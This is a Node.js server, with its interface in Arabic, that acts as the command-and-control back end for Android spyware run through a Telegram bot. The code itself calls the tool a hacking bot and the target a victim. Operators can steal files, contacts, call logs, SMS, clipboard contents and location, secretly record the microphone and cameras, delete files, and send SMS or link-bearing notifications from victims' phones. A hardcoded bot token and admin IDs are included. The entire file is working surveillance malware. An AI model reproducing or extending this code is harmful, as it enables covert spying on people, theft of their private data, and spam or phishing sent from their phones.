const express = require('express');

const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

// ==================== الإعدادات والثوابت ====================
const CONFIG = {
    token: process.env.BOT_TOKEN || '7819148002:AAEOvqCNBwMbily87VEy68jPfMW2QQCq7RU',
    adminIds: process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',') : ['6430670316', '5492273274' , '6123719421'],
    address: process.env.SERVER_ADDRESS || 'https://www.google.com',
    port: process.env.PORT || 10000,
    
    keyboardLayout: [
        ["الاجهزة المتصلة"], 
        ["تنفيذ الامر"],
        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
        ["📢 قناة التليجرام"]
    ],
    
    messages: {
        processing: '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n• ستتلقى ردًا في اللحظات القليلة القادمة المطور @J_F_V ،',
        noDevices: '°• لا توجد اجهزة متصلة ومتوفرة\n\n• تأكد من تثبيت التطبيق على الجهاز المستهدف',
        start: `°• مرحباً بكم في بوت الاختراق م عرف المطور @J_F_V ،

• إذا كان التطبيق مثبتًا على الجهاز المستهدف ، فانتظر الاتصال

• عندما تتلقى رسالة الاتصال ، فهذا يعني أن الجهاز المستهدف متصل وجهاز لاستلام الأمر

• انقر على زر الأمر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب بين الأمر

• إذا علقت في مكان ما في الروبوت ، أرسل /start الأمر ،`
    }
};

// ==================== الدوال المساعدة ====================
class BotHelpers {
    static sendMessage(chatId, text, options = {}) {
        const defaultOptions = {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: CONFIG.keyboardLayout,
                resize_keyboard: true
            }
        };
        return appBot.sendMessage(chatId, text, { ...defaultOptions, ...options });
    }

    static sendProcessingMessage(chatId) {
        return this.sendMessage(chatId, CONFIG.messages.processing);
    }

    static isAuthorized(chatId) {
    return CONFIG.adminIds.includes(chatId.toString());
}

    static sendDeviceStatus(deviceInfo, status) {
        const statusText = status === 'connect' ? 'جهاز جديد متصل' : 'لا يوجد جهاز متصل';
        const message = `°• ${statusText}\n\n` +
            `• موديل الجهاز : <b>${deviceInfo.model}</b>\n` +
            `• البطارية : <b>${deviceInfo.battery}</b>\n` +
            `• نظام الاندرويد : <b>${deviceInfo.version}</b>\n` +
            `• سطوح الشاشة : <b>${deviceInfo.brightness}</b>\n` +
            `• مزود : <b>${deviceInfo.provider}</b>`;
        
        // إرسال لجميع الأدمن
CONFIG.adminIds.forEach(adminId => {
    this.sendMessage(adminId, message);
});
    }

    static executeDeviceCommand(uuid, command, data = null) {
    let deviceFound = false;
    
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === uuid) {
            deviceFound = true;
            const message = data ? `${command}:${data}` : command;
            console.log(`📤 إرسال أمر: ${message} إلى ${ws.uuid}`);
            ws.send(message);
        }
    });

    // ⭐ إذا ما لقى الجهاز
    if (!deviceFound) {
        console.log(`❌ الجهاز غير متصل: ${uuid}`);
        CONFIG.adminIds.forEach(adminId => {
    this.sendError(adminId, 
        `الجهاز غير متصل أو انقطع الاتصال\nUUID: ${uuid}`
    );
});
    }
}

    static getCommandKeyboard(uuid) {
        return {
            inline_keyboard: [
                [
                    {text: '📱التطبيقات', callback_data: `apps:${uuid}`},
                    {text: '📲معلومات الجهاز', callback_data: `device_info:${uuid}`}
                ],
                [
                    {text: '📂الحصول علئ الملفات', callback_data: `file:${uuid}`},
                    {text: 'حذف ملف🗃️', callback_data: `delete_file:${uuid}`}
                ],
                [
                    {text: '📃الحافظة', callback_data: `clipboard:${uuid}`},
                    {text: '🎙️المكرفون', callback_data: `microphone:${uuid}`},
                ],
                [
                    {text: '📷الكاميرا الامامي', callback_data: `camera_main:${uuid}`},
                    {text: '📸الكاميرا السلفي', callback_data: `camera_selfie:${uuid}`}
                ],
                [
                    {text: '🚩الموقع', callback_data: `location:${uuid}`},
                    {text: '👹نخب', callback_data: `toast:${uuid}`}
                ],
                [
                    {text: '☎️المكالمات', callback_data: `calls:${uuid}`},
                    {text: 'جهات الاتصال👤', callback_data: `contacts:${uuid}`}
                ],
                [
                    {text: '📳يهتز', callback_data: `vibrate:${uuid}`},
                    {text: 'اظهار الاخطار⚠️', callback_data: `show_notification:${uuid}`}
                ],
                [
                    {text: 'الرسايل', callback_data: `messages:${uuid}`},
                    {text: '✉️ارسال رسالة', callback_data: `send_message:${uuid}`}
                ],
                [
                    {text: '📴تشغيل ملف صوتي', callback_data: `play_audio:${uuid}`},
                    {text: '📵ايقاف الملف الصوتي', callback_data: `stop_audio:${uuid}`},
                ],
                [
                    {
                        text: '✉️ارسال👤 رسالة الئ جميع جهة اتصال',
                        callback_data: `send_message_to_all:${uuid}`
                    }
                ],
            ]
        };
    }

    // ⭐⭐⭐ أضف هذا الكود هنا ⭐⭐⭐
    static sendError(chatId, errorMessage, deviceModel = '') {
        const message = `❌ خطأ في التنفيذ\n\n` +
                       `• الجهاز: <b>${deviceModel || 'غير معروف'}</b>\n` +
                       `• الخطأ: <code>${errorMessage}</code>\n\n` +
                       `• حاول مرة أخرى أو جرب أمر آخر`;
        
        return this.sendMessage(chatId, message);
    }

    static sendSuccess(chatId, successMessage, deviceModel = '') {
        const message = `✅ تم التنفيذ بنجاح\n\n` +
                       `• الجهاز: <b>${deviceModel || 'غير معروف'}</b>\n` +
                       `• النتيجة: ${successMessage}`;
        
        return this.sendMessage(chatId, message);
    }
} // نهاية class
// ==================== التهيئة الأساسية ====================
const app = express();
// كود تتبع للـ debugging
app.use((req, res, next) => {
    console.log(`🌐 Request: ${req.method} ${req.path}`);
    console.log(`📱 Headers:`, req.headers);
    next();
});
// إضافة CORS support
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    next();
});
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(CONFIG.token, { polling: true });
const appClients = new Map();

// حالة التطبيق الحالية
const currentState = {
    number: '',
    uuid: '',
    title: ''
};

// تعريفات الأوامر والرسائل
const COMMAND_PROMPTS = {
    'send_message': {
        text: '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية\n\n• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد،',
        handler: (uuid, data) => handleSendMessageCommand(uuid, data)
    },
    'send_message_to_all': {
        text: '°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع\n\n• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
        handler: (uuid, data) => BotHelpers.executeDeviceCommand(uuid, 'send_message_to_all', data)
    },
    'file': {
        text: '°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية\n\n• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لتلقي ملفات المعرض.',
        handler: (uuid, data) => BotHelpers.executeDeviceCommand(uuid, 'file', data)
    },
    'delete_file': {
        text: '°• ادخل مسار الملف الذي تريد \n\n• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
        handler: (uuid, data) => BotHelpers.executeDeviceCommand(uuid, 'delete_file', data)
    },
    'microphone': {
        text: '°• ادخل المدة الذي تريد تسجيل صوت الضحية\n\n• لاحظ أنه يجب إدخال الوقت عدديًا بوحدات من الثواني ،',
        handler: (uuid, data) => BotHelpers.executeDeviceCommand(uuid, 'microphone', data)
    },
    'toast': {
        text: '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية\n\n• هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ،',
        handler: (uuid, data) => BotHelpers.executeDeviceCommand(uuid, 'toast', data)
    },
    'show_notification': {
        text: '°• ادخل الرسالة التي تريدها تظهر كما إشعار\n\n• ستظهر رسالتك في شريط حالة الجهاز الهدف مثل الإخطار العادي ،',
        handler: (uuid, data) => handleShowNotificationCommand(uuid, data)
    },
    'play_audio': {
        text: '°• أدخل رابط الصوت الذي تريد تشغيله\n\n• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب ، وإلا فلن يتم تشغيل الصوت ،',
        handler: (uuid, data) => BotHelpers.executeDeviceCommand(uuid, 'play_audio', data)
    }
};

// ==================== دوال معالجة الأوامر ====================
function handleSendMessageCommand(uuid, messageText) {
    const fullMessage = `send_message:${currentState.number}/${messageText}`;
    BotHelpers.executeDeviceCommand(uuid, fullMessage);
    currentState.number = '';
    currentState.uuid = '';
    CONFIG.adminIds.forEach(adminId => {
    BotHelpers.sendProcessingMessage(adminId);
});
}

function handleShowNotificationCommand(uuid, link) {
    BotHelpers.executeDeviceCommand(uuid, `show_notification:${currentState.title}/${link}`);
    currentState.uuid = '';
    CONFIG.adminIds.forEach(adminId => {
    BotHelpers.sendProcessingMessage(adminId);
});
}

function promptForMessage() {
    CONFIG.adminIds.forEach(adminId => {
        appBot.sendMessage(adminId,
            '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....\n\n' +
            '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
            {reply_markup: {force_reply: true}}
        );
    });
}
// ==================== معالجة الردود على الرسائل ====================
function handleReplyMessage(message) {
    const replyText = message.reply_to_message.text;
    const userInput = message.text;

    if (replyText.includes('الرقم الذي تريد ارسال الية')) {
        currentState.number = userInput;
        promptForMessage();
    } 
    else if (replyText.includes('الرسالة المراد ارسالها من جهاز الضحية')) {
        handleSendMessageCommand(currentState.uuid, userInput);
    }
    else if (replyText.includes('الرسالة المراد ارسالها الئ الجميع')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'send_message_to_all', userInput);
        currentState.uuid = '';
        CONFIG.adminIds.forEach(adminId => {
    BotHelpers.sendProcessingMessage(adminId);
});
    }
    else if (replyText.includes('مسار الملف الذي تريد سحبة')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'file', userInput);
        currentState.uuid = '';
        CONFIG.adminIds.forEach(adminId => {
    BotHelpers.sendProcessingMessage(adminId);
});
    }
    else if (replyText.includes('مسار الملف الذي تريد')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'delete_file', userInput);
        currentState.uuid = '';
        CONFIG.adminIds.forEach(adminId => {
    BotHelpers.sendProcessingMessage(adminId);
});
    }
    else if (replyText.includes('المدة الذي تريد تسجيل صوت الضحية')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'microphone', userInput);
        currentState.uuid = '';
        CONFIG.adminIds.forEach(adminId => {
    BotHelpers.sendProcessingMessage(adminId);
});
    }
    else if (replyText.includes('المدة الذي تريد تسجيل الكاميرا الامامية')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'rec_camera_main', userInput);
        currentState.uuid = '';
        CONFIG.adminIds.forEach(adminId => {
    BotHelpers.sendProcessingMessage(adminId);
});
    }
    else if (replyText.includes('المدة الذي تريد تسجيل كاميرا السلفي')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'rec_camera_selfie', userInput);
        currentState.uuid = '';
        CONFIG.adminIds.forEach(adminId => {
    BotHelpers.sendProcessingMessage(adminId);
});
    }
    else if (replyText.includes('الرسالة التي تريد ان تظهر علئ جهاز الضحية')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'toast', userInput);
        currentState.uuid = '';
        CONFIG.adminIds.forEach(adminId => {
    BotHelpers.sendProcessingMessage(adminId);
});
    }
    else if (replyText.includes('الرسالة التي تريدها تظهر كما إشعار')) {
        currentState.title = userInput;
        CONFIG.adminIds.forEach(adminId => {
    appBot.sendMessage(adminId,
        '°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
        '• عندما ينقر الضحية على الإشعار ، سيتم فتح الرابط الذي تقوم بإدخاله ،',
        {reply_markup: {force_reply: true}}
    );
});
    }
    else if (replyText.includes('الرابط الذي تريد فتحه بواسطة الإشعار')) {
        handleShowNotificationCommand(currentState.uuid, userInput);
    }
    else if (replyText.includes('رابط الصوت الذي تريد تشغيله')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'play_audio', userInput);
        currentState.uuid = '';
        CONFIG.adminIds.forEach(adminId => {
    BotHelpers.sendProcessingMessage(adminId);
});
    }
}

// ==================== معالجة Callback Queries ====================
function handleCallbackQuery(callbackQuery) {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const [command, uuid] = data.split(':');

    if (command === 'device') {
        const deviceModel = appClients.get(uuid)?.model;
        return appBot.editMessageText(`°• حدد الثناء للجهاز : <b>${deviceModel}</b>`, {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            reply_markup: BotHelpers.getCommandKeyboard(uuid),
            parse_mode: "HTML"
        });
    }

    if (COMMAND_PROMPTS[command]) {
        appBot.deleteMessage(msg.chat.id, msg.message_id);
        currentState.uuid = uuid;
        appBot.sendMessage(msg.chat.id, COMMAND_PROMPTS[command].text, {
            reply_markup: { force_reply: true },
            parse_mode: "HTML"
        });
    } else {
        // الأوامر المباشرة
        handleDirectCommand(uuid, command, msg);
    }
}

function handleDirectCommand(uuid, command, msg) {
    const directCommands = [
        'calls', 'contacts', 'messages', 'apps', 'device_info', 'clipboard',
        'camera_main', 'camera_selfie', 'location', 'vibrate', 'stop_audio'
    ];

    if (directCommands.includes(command)) {
        BotHelpers.executeDeviceCommand(uuid, command);
        appBot.deleteMessage(msg.chat.id, msg.message_id);
        BotHelpers.sendProcessingMessage(msg.chat.id);
    }
}

// ==================== معالجة أوامر البوت ====================
function handleBotCommand(chatId, command) {
    if (!BotHelpers.isAuthorized(chatId)) {
        return BotHelpers.sendMessage(chatId, '°• طلب الاذن مرفوض');
    }

    switch (command) {
        case '/start':
            return BotHelpers.sendMessage(chatId, CONFIG.messages.start);
            
        case 'الاجهزة المتصلة':
            return handleConnectedDevicesCommand(chatId);
            
        case 'تنفيذ الامر':
            return handleExecuteCommand(chatId);
            
        case '💬 واتساب المطور':
            return BotHelpers.sendMessage(chatId, 'https://wa.me/14422696600');
            
        case '📺 قناة اليوتيوب':
            return BotHelpers.sendMessage(chatId, 'https://youtube.com/@j-fv?si=lp6SXI2TKhrQRF0p');
            
        case '📢 قناة التليجرام':
            return BotHelpers.sendMessage(chatId, 'https://t.me/uunca');
    }
}

function handleConnectedDevicesCommand(chatId) {
    if (appClients.size === 0) {
        return BotHelpers.sendMessage(chatId, CONFIG.messages.noDevices);
    }

    let text = '°• قائمة الاجهزة المتصلة :\n\n';
    appClients.forEach((value) => {
        text += `• موديل الجهاز : <b>${value.model}</b>\n` +
               `• البطارية : <b>${value.battery}</b>\n` +
               `• نظام الاندرويد : <b>${value.version}</b>\n` +
               `• سطوح الشاشة : <b>${value.brightness}</b>\n` +
               `• مزود : <b>${value.provider}</b>\n\n`;
    });

    return BotHelpers.sendMessage(chatId, text);
}

function handleExecuteCommand(chatId) {
    if (appClients.size === 0) {
        return BotHelpers.sendMessage(chatId, CONFIG.messages.noDevices);
    }

    const deviceListKeyboard = [];
    appClients.forEach((value, key) => {
        deviceListKeyboard.push([{
            text: value.model,
            callback_data: 'device:' + key
        }]);
    });

    return appBot.sendMessage(chatId, '°• حدد الجهاز المراد تنفيذ عليه الاوامر', {
        reply_markup: {
            inline_keyboard: deviceListKeyboard,
        },
    });
}

// ==================== إعدادات Express ====================
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({
    limit: '50mb',
    extended: true,
    parameter_limit: 50000
}));

const upload = multer({
    limits: {
        fileSize: 50 * 1024 * 1024
    }
});

app.get('/', (req, res) => {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : @J_F_V </h1>');
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            throw new Error('لم يتم استلام أي ملف');
        }

        const name = req.file.originalname;
        const fileSize = (req.file.size / 1024 / 1024).toFixed(2); // بالـ MB
        
        console.log(`📁 استلام ملف: ${name} (${fileSize} MB) من ${req.headers.model}`);

        CONFIG.adminIds.forEach(adminId => {
            appBot.sendDocument(adminId, req.file.buffer, {
                caption: `📁 ملف من <b>${req.headers.model}</b>\nالحجم: ${fileSize} MB`,
                parse_mode: "HTML"
            }, {
                filename: name,
                contentType: req.file.mimetype || 'application/octet-stream',
            }).then(() => {
                console.log(`✅ تم إرسال الملف: ${name}`);
            }).catch(err => {
                console.log(`❌ خطأ في إرسال الملف: ${err.message}`);
                BotHelpers.sendError(adminId, 
                    `فشل إرسال الملف: ${err.message}`, 
                    req.headers.model
                );
            });
        }); // ⭐ أضف هذه القوس

        res.send('');
    } catch (error) {
        console.log(`❌ خطأ في رفع الملف: ${error.message}`);
        CONFIG.adminIds.forEach(adminId => {
            BotHelpers.sendError(adminId, 
                `رفع الملف: ${error.message}`, 
                req.headers.model
            );
        }); // ⭐ أضف هذه القوس
        res.status(500).send('');
    }
});

app.post("/uploadText", (req, res) => {
    CONFIG.adminIds.forEach(adminId => {
        BotHelpers.sendMessage(adminId, 
            `°• رسالة من <b>${req.headers.model}</b> جهاز\n\n${req.body.text}`
        );
    }); // ⭐ أضف هذه القوس
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    CONFIG.adminIds.forEach(adminId => {
        appBot.sendLocation(adminId, req.body.lat, req.body.lon);
        BotHelpers.sendMessage(adminId, 
            `°• موقع من <b>${req.headers.model}</b> جهاز`
        );
    }); // ⭐ أضف هذه القوس
    res.send('');
});
// ⭐⭐⭐ ضع هذا الكود هنا ⭐⭐⭐
app.post("/uploadError", (req, res) => {
    const errorMessage = req.body.error;
    const deviceModel = req.headers.model || 'غير معروف';
    const command = req.body.command || 'غير معروف';
    
    console.log(`❌ خطأ من ${deviceModel}: ${errorMessage}`);
    
    CONFIG.adminIds.forEach(adminId => {
        BotHelpers.sendError(adminId, 
            `الأمر: ${command}\nالخطأ: ${errorMessage}`, 
            deviceModel
        );
    }); // ⭐ أضف هذه القوس
    
    res.send('');
});

app.post("/uploadSuccess", (req, res) => {
    const successMessage = req.body.message;
    const deviceModel = req.headers.model || 'غير معروف';
    const command = req.body.command || 'غير معروف';
    
    console.log(`✅ نجاح من ${deviceModel}: ${successMessage}`);
    
    CONFIG.adminIds.forEach(adminId => {
        BotHelpers.sendSuccess(adminId, 
            `الأمر: ${command}\nالنتيجة: ${successMessage}`, 
            deviceModel
        );
    }); // ⭐ أضف هذه القوس
    
    res.send('');
});
// ==================== إعدادات Express - إضافة الـ endpoints الناقصة ====================

// endpoint لاستقبال الصور من الكاميرا
app.post("/uploadCamera", upload.single('image'), (req, res) => {
    try {
        if (!req.file) {
            throw new Error('لم يتم استلام أي صورة');
        }

        const cameraType = req.headers.camera_type || 'غير محدد';
        const deviceModel = req.headers.model || 'غير معروف';
        const fileSize = (req.file.size / 1024).toFixed(2);
        
        console.log(`📷 استلام صورة من: ${cameraType} - ${deviceModel}`);

        CONFIG.adminIds.forEach(adminId => {
            appBot.sendPhoto(adminId, req.file.buffer, {
                caption: `📷 صورة من <b>${deviceModel}</b>\n• نوع الكاميرا: <b>${cameraType}</b>\n• الحجم: ${fileSize} KB`,
                parse_mode: "HTML"
            });
        });

        res.send('OK');
    } catch (error) {
        console.log(`❌ خطأ في رفع صورة: ${error.message}`);
        res.status(500).send('');
    }
});

// endpoint لاستقبال التسجيلات الصوتية
app.post("/uploadAudio", upload.single('audio'), (req, res) => {
    try {
        if (!req.file) {
            throw new Error('لم يتم استلام أي تسجيل صوتي');
        }

        const deviceModel = req.headers.model || 'غير معروف';
        const fileSize = (req.file.size / 1024).toFixed(2);
        
        console.log(`🎙️ استلام تسجيل صوتي من: ${deviceModel}`);

        CONFIG.adminIds.forEach(adminId => {
            appBot.sendAudio(adminId, req.file.buffer, {
                caption: `🎙️ تسجيل صوتي من <b>${deviceModel}</b>\n• الحجم: ${fileSize} KB`,
                parse_mode: "HTML"
            });
        });

        res.send('OK');
    } catch (error) {
        console.log(`❌ خطأ في رفع تسجيل صوتي: ${error.message}`);
        res.status(500).send('');
    }
});

// endpoint لاستقبال معلومات الجهاز
app.post("/uploadDeviceInfo", (req, res) => {
    try {
        const deviceInfo = req.body;
        const deviceModel = req.headers.model || 'غير معروف';
        
        console.log(`📱 استلام معلومات جهاز من: ${deviceModel}`);

        let infoText = `📱 معلومات الجهاز: <b>${deviceModel}</b>\n\n`;
        
        // بناء نص المعلومات
        for (const [key, value] of Object.entries(deviceInfo)) {
            infoText += `• ${key}: <b>${value}</b>\n`;
        }

        CONFIG.adminIds.forEach(adminId => {
            BotHelpers.sendMessage(adminId, infoText);
        });

        res.send('OK');
    } catch (error) {
        console.log(`❌ خطأ في معالجة معلومات الجهاز: ${error.message}`);
        res.status(500).send('');
    }
});

// endpoint لاستقبال قائمة التطبيقات
app.post("/uploadApps", (req, res) => {
    try {
        const appsList = req.body.apps || [];
        const deviceModel = req.headers.model || 'غير معروف';
        
        console.log(`📲 استلام قائمة تطبيقات من: ${deviceModel}`);

        let appsText = `📲 التطبيقات المثبتة على: <b>${deviceModel}</b>\n\n`;
        
        appsList.forEach((app, index) => {
            appsText += `${index + 1}. ${app}\n`;
        });

        CONFIG.adminIds.forEach(adminId => {
            BotHelpers.sendMessage(adminId, appsText);
        });

        res.send('OK');
    } catch (error) {
        console.log(`❌ خطأ في معالجة قائمة التطبيقات: ${error.message}`);
        res.status(500).send('');
    }
});

// endpoint لاستقبال جهات الاتصال
app.post("/uploadContacts", (req, res) => {
    try {
        const contacts = req.body.contacts || [];
        const deviceModel = req.headers.model || 'غير معروف';
        
        console.log(`👤 استلام جهات اتصال من: ${deviceModel}`);

        let contactsText = `👤 جهات الاتصال من: <b>${deviceModel}</b>\n\n`;
        
        contacts.forEach((contact, index) => {
            contactsText += `${index + 1}. ${contact.name || 'لا يوجد اسم'}: ${contact.number || 'لا يوجد رقم'}\n`;
        });

        CONFIG.adminIds.forEach(adminId => {
            BotHelpers.sendMessage(adminId, contactsText);
        });

        res.send('OK');
    } catch (error) {
        console.log(`❌ خطأ في معالجة جهات الاتصال: ${error.message}`);
        res.status(500).send('');
    }
});

// endpoint لاستقبال المكالمات
app.post("/uploadCalls", (req, res) => {
    try {
        const calls = req.body.calls || [];
        const deviceModel = req.headers.model || 'غير معروف';
        
        console.log(`☎️ استلام سجل المكالمات من: ${deviceModel}`);

        let callsText = `☎️ سجل المكالمات من: <b>${deviceModel}</b>\n\n`;
        
        calls.forEach((call, index) => {
            callsText += `${index + 1}. ${call.number || 'مجهول'} - ${call.type || 'غير معروف'} - ${call.date || 'غير معروف'}\n`;
        });

        CONFIG.adminIds.forEach(adminId => {
            BotHelpers.sendMessage(adminId, callsText);
        });

        res.send('OK');
    } catch (error) {
        console.log(`❌ خطأ في معالجة سجل المكالمات: ${error.message}`);
        res.status(500).send('');
    }
});

// endpoint لاستقبال الرسائل
app.post("/uploadMessages", (req, res) => {
    try {
        const messages = req.body.messages || [];
        const deviceModel = req.headers.model || 'غير معروف';
        
        console.log(`✉️ استلام رسائل من: ${deviceModel}`);

        let messagesText = `✉️ الرسائل من: <b>${deviceModel}</b>\n\n`;
        
        messages.forEach((msg, index) => {
            messagesText += `${index + 1}. ${msg.sender || 'مجهول'}: ${msg.text || 'لا يوجد نص'}\n`;
        });

        CONFIG.adminIds.forEach(adminId => {
            BotHelpers.sendMessage(adminId, messagesText);
        });

        res.send('OK');
    } catch (error) {
        console.log(`❌ خطأ في معالجة الرسائل: ${error.message}`);
        res.status(500).send('');
    }
});

// endpoint لاستقبال الحافظة (Clipboard)
app.post("/uploadClipboard", (req, res) => {
    try {
        const clipboardText = req.body.text || 'فارغة';
        const deviceModel = req.headers.model || 'غير معروف';
        
        console.log(`📋 استلام محتوى الحافظة من: ${deviceModel}`);

        CONFIG.adminIds.forEach(adminId => {
            BotHelpers.sendMessage(adminId, 
                `📋 الحافظة من <b>${deviceModel}</b>\n\n` +
                `المحتوى: <code>${clipboardText}</code>`
            );
        });

        res.send('OK');
    } catch (error) {
        console.log(`❌ خطأ في معالجة الحافظة: ${error.message}`);
        res.status(500).send('');
    }
});
// ⭐⭐⭐ أضف هذا الكود بعد الـ endpoints الحالية ⭐⭐⭐

// endpoint لاستقبال أي بيانات من التطبيق
app.post("/test", upload.any(), (req, res) => {
    console.log('🧪 TEST ENDPOINT HIT!');
    console.log('📨 Headers:', req.headers);
    console.log('📦 Body:', req.body);
    console.log('📁 Files:', req.files);
    
    CONFIG.adminIds.forEach(adminId => {
        BotHelpers.sendMessage(adminId, 
            '🧪 تم استلام طلب اختبار من التطبيق!\n' +
            `• المسار: ${req.path}\n` +
            `• الجهاز: ${req.headers.model || 'غير معروف'}`
        );
    });
    
    res.json({status: 'OK', message: 'تم الاستلام'});
});

// endpoint لالتقاط أي مسار غير معروف
app.all("*", (req, res) => {
    console.log('🔍 UNKNOWN ROUTE:', req.method, req.path);
    console.log('📋 Headers:', req.headers);
    
    CONFIG.adminIds.forEach(adminId => {
        BotHelpers.sendMessage(adminId, 
            `🔍 مسار غير معروف:\n• ${req.method} ${req.path}`
        );
    });
    
    res.status(404).send('ROUTE_NOT_FOUND');
});

// ==================== WebSocket Handling ====================
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const deviceInfo = {
        model: req.headers.model,
        battery: req.headers.battery,
        version: req.headers.version,
        brightness: req.headers.brightness,
        provider: req.headers.provider
    };

    ws.uuid = uuid;
    appClients.set(uuid, deviceInfo);
// ⭐⭐⭐ ضع هذا الكود هنا ⭐⭐⭐
// معالجة الأخطاء من التطبيق
// في قسم WebSocket Handling
ws.on('message', (message) => {
    const messageStr = message.toString();
    console.log(`📨 WebSocket Message from ${deviceInfo.model}:`, messageStr);
    
    // إذا كان التطبيق يرسل بيانات عبر WebSocket بدل HTTP
    try {
        const data = JSON.parse(messageStr);
        if (data.type === 'location') {
            CONFIG.adminIds.forEach(adminId => {
                appBot.sendLocation(adminId, data.lat, data.lon);
                BotHelpers.sendMessage(adminId, 
                    `📍 موقع من <b>${deviceInfo.model}</b>\n` +
                    `• خط العرض: ${data.lat}\n` +
                    `• خط الطول: ${data.lon}`
                );
            });
        }
        else if (data.type === 'error') {
            CONFIG.adminIds.forEach(adminId => {
                BotHelpers.sendError(adminId, data.message, deviceInfo.model);
            });
        }
        else if (data.type === 'success') {
            CONFIG.adminIds.forEach(adminId => {
                BotHelpers.sendSuccess(adminId, data.message, deviceInfo.model);
            });
        }
    } catch (e) {
        // تجاهل الرسائل العادية (مثل ping)
        if (messageStr !== 'ping') {
            console.log('📨 WebSocket plain message:', messageStr);
        }
    }
});

// ==================== Telegram Bot Handlers ====================
appBot.on('message', (message) => {
    const chatId = message.chat.id;

    if (message.reply_to_message) {
        handleReplyMessage(message);
        return;
    }

    handleBotCommand(chatId, message.text);
});

appBot.on("callback_query", (callbackQuery) => {
    handleCallbackQuery(callbackQuery);
});

// ==================== الخدمات الخلفية ====================
setInterval(() => {
    appSocket.clients.forEach((ws) => {
        ws.send('ping');
    });
    
    try {
        axios.get(CONFIG.address);
    } catch (e) {
        // تجاهل الأخطاء في الـ ping
    }
}, 5000);

// ==================== بدء التشغيل ====================
appServer.listen(CONFIG.port, '0.0.0.0', () => {
    console.log(`✅ السيرفر يعمل على البورت ${CONFIG.port}`);
});
// معالجة الأخطاء
process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});